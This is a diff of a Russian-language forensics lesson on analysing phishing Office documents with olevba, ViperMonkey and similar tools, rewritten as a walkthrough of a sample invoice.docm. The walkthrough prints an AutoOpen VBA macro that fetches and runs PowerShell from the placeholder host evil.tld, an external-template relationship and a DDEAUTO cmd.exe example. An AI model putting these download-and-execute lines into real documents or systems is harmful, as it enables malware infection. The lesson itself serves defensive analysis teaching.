@@ -14,27 +14,35 @@ useful_for:
 estimated_minutes: 50
 summary: "Разбор документов Office (docm/xlsm/docx): OLE-структура, извлечение и деобфускация VBA-макросов (olevba), встроенные объекты, шаблоны-приманки и индикаторы фишинга."
 ---
-Office-документы — один из главных векторов фишинга: макросы (VBA), встроенные объекты, эксплойты, внешние шаблоны. Разбор такого документа отвечает на вопросы: что исполнялось, куда обращалось, что загружалось. Этот урок — про структуру OLE/OOXML, извлечение и деобфускацию макросов, встроенные объекты и индикаторы фишинга.
 
-## Форматы: OLE и OOXML
+## Вопрос, с которого всё начинается
 
-| Формат | Тип | Расширения |
-|--------|-----|-----------|
-| OLE (Compound File Binary) | бинарный контейнер | `.doc`, `.xls`, `.ppt`, `.docm` (частично) |
-| OOXML (ZIP) | XML в ZIP | `.docx`, `.xlsx`, `.pptx`, `.docm`, `.xlsm` |
-| RTF | текст с OLE-объектами | `.rtf` |
+В прошлом уроке мы вытащили из почтового архива вложение `invoice.docm` — «счёт», который сотрудник открыл. Задача: понять, что этот документ делает, **не открывая его**. Открыть в Word нельзя — сработает макрос и, возможно, заразит машину прямо во время разбора.
 
-**OLE** — контейнер с потоками (streams), как мини-ФС внутри файла. **OOXML** — обычный ZIP с XML-частями; макросы лежат в `word/vbaProject.bin`. Важное: файл с расширением `.docx` (без макросов) может содержать `vbaProject.bin`, если его переименовали — проверяйте содержимое, а не расширение.
+Документ Office — это не просто текст. Внутри спрятаны **макросы** — маленькие программы на языке VBA, которые запускаются при открытии. Именно они несут нагрузку. Разберём документ слой за слоем.
+
+## Наш пример: `invoice.docm`
+
+Первым делом — что это за формат. Команда `file` читает магические байты:
 
 ```bash
-$ file invoice.doc
-invoice.doc: Composite Document File V2 Document, ... (OLE)
-$ file invoice.docx
-invoice.docx: Microsoft Word 2007+ (ZIP)
-$ unzip -l invoice.docx | grep -iE 'vba|macro|oleObject|embeddings'
+$ file invoice.docm
+invoice.docm: Microsoft Word 2007+ (ZIP)
 ```
 
-## Извлечение макросов: olevba и oledump
+`.docm` — это **OOXML**: документ, упакованный в обычный ZIP-архив из XML-файлов. Расширение `.docm` говорит «макросы разрешены», но это лишь ярлык — настоящий ответ даёт содержимое. Заглянем внутрь как в архив:
+
+```bash
+$ unzip -l invoice.docm | grep -iE 'vba|macro|embed|oleObject'
+    10240  2025-10-06 14:10   word/vbaProject.bin
+      512  2025-10-06 14:10   word/embeddings/oleObject1.bin
+```
+
+Два интересных файла. `vbaProject.bin` — это и есть скомпилированный VBA-проект (макрос). `embeddings/oleObject1.bin` — встроенный объект (о нём позже). Самое важное правило: **доверять содержимому, а не расширению**. Файл `invoice.docx` (без буквы `m`) может точно так же содержать `vbaProject.bin`, если его переименовали, чтобы усыпить бдительность.
+
+## Шаг 1: извлекаем макрос
+
+Читать `vbaProject.bin` руками бесполезно — это бинарный формат. Инструмент `olevba` (из набора `oletools`) распаковывает его в читаемый код и сразу помечает подозрительные вызовы:
 
 ```bash
 $ olevba invoice.docm
@@ -42,245 +50,133 @@ VBA MACRO ThisDocument.cls
 in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 Sub AutoOpen()
-    Shell "powershell -enc SQBFAFgA..."
-End Sub
-```
-
-```bash
-$ olevba --decode --deobf invoice.docm      # декодировать/деобфусцировать
-$ olevba -a invoice.docm                     # анализ всех потоков
-$ oledump.py invoice.docm -s 8 -d            # конкретный поток
-$ oledump.py invoice.docm -i                # список потоков
-$ mraptor invoice.docm                       # оценка «вредоносности» макроса
-```
-
-`olevba` распознаёт подозрительные вызовы (`Shell`, `WScript.Shell`, `CreateObject`, `AutoOpen`, `Document_Open`), декодирует `Chr()`/`StrReverse`/base64 и показывает IOC.
-
-## OOXML вручную
-
-```bash
-$ unzip -o invoice.docx -d docx/
-$ ls docx/word/
-document.xml  vbaProject.bin  _rels/  embeddings/
-$ python3 olevba docx/word/vbaProject.bin
-# внешние связи (шаблон)
-$ cat docx/word/_rels/settings.xml.rels
-# встроенные объекты
-$ file docx/word/embeddings/*
-```
-
-Частый приём — **template injection**: `settings.xml.rels` указывает на внешний шаблон (`TargetMode="External"`), который загружается при открытии и содержит макрос. Это позволяет обойти статический анализ (в документе макроса нет).
-
-## Деобфускация VBA
-
-Макросы обфусцируют: конкатенация строк, `Chr()`, `StrReverse`, base64, глобальные переменные, «мусорные» конструкции.
-
-```bash
-# olevba --deobf убирает часть обфускации
-$ olevba --deobf --decode invoice.docm
-# ручной разбор: найти Chr/StrReverse
-$ grep -oE 'Chr\([0-9]+\)' macro.txt | head
-# декодировать base64 из макроса
-$ echo '<base64>' | base64 -d | iconv -f UTF-16LE -t UTF-8
-```
-
-Инструменты: `olevba`, `ViperMonkey` (эмуляция VBA), `pcodedmp` (P-код), `officeparser`. `ViperMonkey` исполняет макрос в песочнице и логирует поведение.
-
-## Встроенные объекты и эксплойты
-
-- **OLE-объекты** (`embeddings/`) — встроенные файлы (EXE, PDF), могут быть нагрузкой.
-- **Эксплойты**: уязвимости в формулах (DDE), equation editor (CVE-2017-11882), OLE (CVE-2014-4114).
-- **DDE**: `{DDEAUTO c:\\windows\\system32\\cmd.exe "/k ..."}` — выполнение без макросов.
-
-```bash
-$ grep -riE 'DDEAUTO|DDE ' docx/ | head
-$ strings docx/word/embeddings/* | grep -iE 'http|cmd|powershell'
-```
-
-## Разобранный пример
-
-Дан `invoice.docm`. Нужно извлечь макрос и IOC.
-
-```bash
-# 1. Тип и потоки
-$ file invoice.docm && unzip -l invoice.docm | grep -i vba
-# 2. Макрос
-$ olevba invoice.docm
-VBA MACRO Module1
-Sub AutoOpen()
-    Dim u As String: u = "http://evil.tld/p.ps1"
+    Dim u As String
+    u = "http://evil.tld/p.ps1"
     Shell "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('" & u & "')"
 End Sub
-# 3. Деобфускация
-$ olevba --deobf invoice.docm | grep -i http
-# 4. IOC
-$ olevba invoice.docm | grep -oE 'https?://[^ "]+' | sort -u
-# 5. Встроенные объекты
-$ unzip -o invoice.docm -d docm/ && file docm/word/embeddings/*
 ```
 
-Итог: макрос `AutoOpen` загружает и исполняет PowerShell-скрипт с `evil.tld` — фишинг с fileless-нагрузкой.
+Разбираем построчно, вводя термины по мере появления. `Sub AutoOpen()` — это **процедура-обработчик**: Word вызывает её автоматически, как только документ открыт. Именно поэтому достаточно открыть файл, чтобы всё сработало.
 
-## Справочная таблица
+Внутри переменной `u` лежит URL, а `Shell` запускает внешнюю программу — `powershell` с ключом `-w hidden` (без окна). Команда `IEX` («Invoke-Expression») выполняет то, что скачает `DownloadString` с `evil.tld`. Итого: документ скачивает и запускает удалённый скрипт — это называется **fileless**-нагрузкой, потому что на диск malware может и не попасть.
 
-| Задача | Инструмент |
-|--------|-----------|
-| Макросы | `olevba`, `oledump` |
-| Эмуляция VBA | `ViperMonkey` |
-| P-код | `pcodedmp` |
-| OOXML | `unzip` |
-| Вредоносность | `mraptor` |
-| Структура | `officeparser` |
+## Шаг 2: снимаем обфускацию
 
-## Частые ошибки
-
-- **Верить расширению** — `.docx` может содержать макрос.
-- **Смотреть только видимый текст** — макрос/объект скрыт.
-- **Не проверять `settings.xml.rels`** — template injection.
-- **Игнорировать `embeddings/`** — там встроенная нагрузка.
-- **Не деобфусцировать** — `Chr()`/base64 скроют IOC.
-- **Пропустить DDE** — выполнение без макросов.
-
-## Что дальше / решение
-
-Конвейер: `file`/`unzip -l` (структура) → `olevba`/`oledump` (макросы) → `--deobf` (обфускация) → `embeddings` (объекты) → IOC. Связка: `forensics-email` (доставка), `forensics-pdf` (PDF-нагрузки), `forensics-malware-yara` (YARA), `forensics-fileless` (PS).
-
-## Эмуляция и динамический анализ
-
-Статический разбор не всегда даёт полную картину (обфускация, вызовы API). Эмуляция макроса показывает реальное поведение без запуска Office.
+Автор малвари почти всегда прячет строки, чтобы статический анализ спотыкался. Частые приёмы: склейка кусков (`"ht" & "tp://"`), функция `Chr(104)` (символ по коду), `StrReverse` (переворот строки), base64. `olevba` умеет их раскручивать:
 
 ```bash
-# ViperMonkey: эмуляция VBA, лог поведения
-$ vmonkey invoice.docm
-# pcodedmp: дамп P-кода (скомпилированного VBA)
-$ pcodedmp invoice.docm
-# извлечь все строки из макроса
-$ olevba --decode invoice.docm | grep -oE '"[^"]{4,}"' | head
+$ olevba --deobf --decode invoice.docm | grep -iE 'http|powershell'
+u = "http://evil.tld/p.ps1"
 ```
 
-ViperMonkey исполняет макрос в песочнице и выводит вызовы (`Shell`, `CreateObject`, `URLDownloadToFile`), URL и пути. Это безопаснее запуска в реальном Office.
-
-## Извлечение и анализ встроенных объектов
+Флаг `--deobf` разворачивает простую обфускацию, `--decode` декодирует base64/hex. Если этого мало, есть `ViperMonkey` — он **эмулирует** макрос в песочнице (исполняет его логику, но не запускает Office) и печатает реальное поведение: какие URL дёргает, какие файлы создаёт.
 
 ```bash
-$ unzip -o invoice.docx -d docx/
-$ for f in docx/word/embeddings/*; do file "$f"; done
-# вложенный OLE-объект разбираем как отдельный документ
-$ olevba docx/word/embeddings/oleObject1.bin
-$ sha256sum docx/word/embeddings/*
+$ vmonkey invoice.docm | grep -iE 'URLDownloadToFile|Shell|http'
 ```
 
-Встроенные объекты часто содержат вторую стадию (EXE, PDF, документ с макросом). Хешируйте и анализируйте их отдельно.
+## Шаг 3: проверяем встроенный объект
 
-## Сводный чек-лист
-
-1. `file` + `unzip -l` — определить формат и наличие `vbaProject.bin`.
-2. `olevba`/`oledump` — извлечь макрос.
-3. `--deobf --decode` — снять обфускацию.
-4. `vmonkey`/`pcodedmp` — эмуляция/декомпиляция.
-5. `settings.xml.rels` — проверить template injection.
-6. `embeddings/` — извлечь встроенные объекты.
-7. `grep` DDEAUTO/DDE — выполнение без макросов.
-8. IOC: URL, IP, пути, хеши — в отчёт.
-
-## Ограничения
-
-- **Пароль на VBA-проект** (`vbaProject.bin` защищён) — обходится инструментами (`olevba` умеет).
-- **P-код без исходника** — `pcodedmp` покажет скомпилированный код.
-- **Внешний шаблон** — макрос вне документа; нужен доступ к URL.
-- **Excel 4.0 (XLM) макросы** — `olevba` частично, нужны специализированные инструменты (`XLMMacroDeobfuscator`).
-- **Онлайн-песочницы** — для сложных случаев (Any.run, Joe Sandbox).
-
-## Excel 4.0 (XLM) макросы
-
-Старый формат макросов Excel (XLM) снова популярен: он хранится в скрытых листах и не виден в обычном VBA-редакторе, а `olevba` показывает его лишь частично. XLM использует формулы-функции (`EXEC`, `CALL`, `REGISTER`, `URLMON`) для загрузки и запуска.
+Помните `embeddings/oleObject1.bin`? Встроенный объект — это файл внутри документа, часто вторая стадия (EXE, PDF или документ с макросом). Распакуем и посмотрим, что это:
 
 ```bash
-# извлечь XLM-макросы
+$ unzip -o invoice.docm -d docm/
+$ file docm/word/embeddings/oleObject1.bin
+docm/word/embeddings/oleObject1.bin: Composite Document File V2 Document, ... (OLE)
+```
+
+Здесь встроен ещё один OLE-документ — его разбирают как отдельный файл (`olevba docm/word/embeddings/oleObject1.bin`) и хешируют.
+
+## Шаг 4: ищем template injection
+
+Есть приём, при котором в самом документе макроса **нет** — он лежит во внешнем шаблоне, который Word подгружает при открытии. Проверяется по связям документа:
+
+```bash
+$ cat docm/word/_rels/settings.xml.rels
+<Relationship ... Target="http://evil.tld/template.dotm" TargetMode="External"/>
+```
+
+`TargetMode="External"` и внешний URL — красный флаг. В документе макроса не видно, а при открытии подтягивается враждебный шаблон. Поэтому проверять надо не только `vbaProject.bin`, но и связи.
+
+## Если макрос не VBA: Excel 4.0
+
+В Word нагрузку несёт VBA, но в Excel есть более старый механизм — макросы **Excel 4.0 (XLM)**. Они хранятся не в `vbaProject.bin`, а в скрытых листах книги, поэтому `olevba` показывает их лишь частично, и их легко пропустить. Вместо кода там формулы с функциями `EXEC`, `CALL`, `URLMON`, которые скачивают и запускают программу.
+
+Признаки XLM-атаки: макрос-листы с именами вроде `Macro1`/`Auto_Open`, скрытые листы и формулы с `EXEC`/`CALL`. Разбирают их отдельным инструментом:
+
+```bash
 $ python3 XLMMacroDeobfuscator.py --file invoice.xlsm
 $ olevba -a invoice.xlsm | grep -iE 'EXEC|CALL|URLMON'
-# скрытые листы
-$ python3 -c "import xlrd;wb=xlrd.open_workbook('invoice.xls');print(wb.sheet_names())"
 ```
 
-Признаки XLM-атаки: макрос-листы с именами вроде `Macro1`/`Auto_Open`, скрытые листы, формулы с `EXEC`/`URLMON`/`CALL`.
+Флаг `-a` в `olevba` заставляет проверить все потоки, а не только первый.
 
-## OLE-структура в деталях
+Ещё один случай — **пароль на VBA-проект**. Автор малвари ставит пароль на `vbaProject.bin`, чтобы его нельзя было открыть в редакторе. Это не защита: `olevba` извлекает код и из защищённого проекта.
 
-OLE-документ (`doc`/`xls`) — это мини-ФС: заголовок с сигнатурой `D0 CF 11 E0 A1 B1 1A E1`, FAT, каталог и потоки. Макрос лежит в потоке `Macros`/`VBA`. Понимание структуры помогает, когда инструменты не срабатывают.
+## Что мы теперь знаем
 
-```bash
-$ xxd -l 8 invoice.doc
-00000000: d0cf 11e0 a1b1 1ae1 ...   # OLE-сигнатура
-$ oledump.py invoice.doc            # список потоков
-$ oledump.py invoice.doc -s 8 -d    # дамп потока с макросом
-```
-
-## Сводка инструментов
-
-| Инструмент | Задача |
-|-----------|--------|
-| `olevba` | макросы (VBA/XLM), декодирование |
-| `oledump` | потоки OLE |
-| `mraptor` | оценка вредоносности |
-| `ViperMonkey` | эмуляция VBA |
-| `pcodedmp` | P-код |
-| `XLMMacroDeobfuscator` | XLM-макросы |
-| `unzip` | OOXML |
-
-## Практические приёмы
-
-- **Двойное расширение** (`invoice.doc.js`) — проверяйте `file`.
-- **Пароль на VBA-проект** — `olevba` обходит.
-- **Template injection** — макрос во внешнем шаблоне (`settings.xml.rels`).
-- **Вложенные объекты** — вторая стадия в `embeddings/`.
-- **Формулы DDE** — выполнение без макросов.
-- **Сравнение с эталоном** — если есть «чистая» версия документа, `diff` покажет добавленное.
+- `.docm`/`.docx` — это ZIP с XML; макрос лежит в `word/vbaProject.bin`.
+- Расширение ничего не гарантирует: `.docx` может содержать макрос.
+- `AutoOpen`/`Document_Open`/`Workbook_Open` — автозапуск макроса при открытии.
+- `olevba` извлекает и деобфусцирует VBA, `ViperMonkey` эмулирует поведение.
+- Нагрузку прячут во встроенных объектах (`embeddings/`) и во внешних шаблонах (`settings.xml.rels`).
+- IOC — это URL, IP, пути и хеши вложений; их фиксируют для отчёта и детекта.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какой инструмент извлекает и декодирует VBA-макросы?"
-  options:
-    - "olevba (oletools)"
-    - "exiftool"
-    - "binwalk"
-    - "strings"
-  answer: 0
-- question: "Где в OOXML-документе лежит макрос?"
+- question: "Где в OOXML-документе лежит VBA-макрос?"
   options:
     - "word/document.xml"
     - "word/vbaProject.bin"
-    - "word/_rels"
+    - "word/_rels/settings.xml.rels"
     - "[Content_Types].xml"
   answer: 1
+  explanation: "Макрос компилируется в отдельный поток word/vbaProject.bin внутри ZIP."
+- question: "Почему документ с макросом опасно открывать в Word для разбора?"
+  options:
+    - "он увеличится в размере"
+    - "сработает AutoOpen и выполнится вредоносный код"
+    - "файл удалится"
+    - "ничего не произойдёт"
+  answer: 1
+  explanation: "Обработчик AutoOpen запускается автоматически при открытии документа."
+- question: "Какой инструмент извлекает и деобфусцирует VBA?"
+  options:
+    - "exiftool"
+    - "olevba (oletools)"
+    - "binwalk"
+    - "sha256sum"
+  answer: 1
+  explanation: "olevba распаковывает vbaProject.bin и умеет --deobf/--decode."
 - question: "Что такое remote template injection?"
   options:
     - "локальный макрос"
-    - "загрузка удалённого шаблона, дающего выполнение без макроса в файле"
+    - "загрузка внешнего шаблона, дающего выполнение без макроса в самом файле"
     - "шифрование документа"
-    - "сжатие"
+    - "сжатие ZIP"
   answer: 1
-- question: "Какой признак автозапуска макроса?"
+  explanation: "settings.xml.rels с TargetMode=External тянет враждебный .dotm при открытии."
+- question: "Что искать в папке word/embeddings/?"
   options:
-    - "Auto_Open / Document_Open / Workbook_Open"
-    - "SaveAs"
-    - "Print"
-    - "Close"
+    - "встроенные объекты — часто вторая стадия нагрузки"
+    - "историю правок"
+    - "пароль документа"
+    - "шрифты"
   answer: 0
-- question: "Почему опасно открывать фишинговый документ в Office?"
-  options:
-    - "он станет больше"
-    - "сработает макрос и выполнится вредоносный код"
-    - "он удалится"
-    - "ничего не произойдёт"
-  answer: 1
+  explanation: "В embeddings лежат встроенные файлы (EXE/PDF/документ), которые несут нагрузку."
 ```
+
+## Куда дальше
+
+Мы разобрали макрос и нашли URL нагрузки. В следующем уроке (`forensics-pdf`) мы возьмём другой частый фишинговый вложение — PDF — и посмотрим, как в нём прячут JavaScript и эксплойты. А пока главное запомни: **Office-документ — это ZIP, макрос лежит в `word/vbaProject.bin`, а `olevba` достаёт и раскручивает его без запуска Word**.
 
 ## Где пригодится
 
 - **CTF:** разбор документа-малвари и извлечение флага.
 - **DFIR:** анализ фишинговых вложений и цепочки заражения.
-- **Threat Hunting:** индикаторы (URL, шаблоны, DDE) для детекта.
-- **SOC:** правила на макросы и remote template.
-- **Судебная экспертиза:** доказательство факта открытия документа.
+- **Threat Hunting:** индикаторы (URL, шаблоны, DDE) для правил детекта.
+- **SOC:** правила на автозапуск макросов и remote template.
+- **Судебная экспертиза:** доказательство факта открытия документа и его поведения.
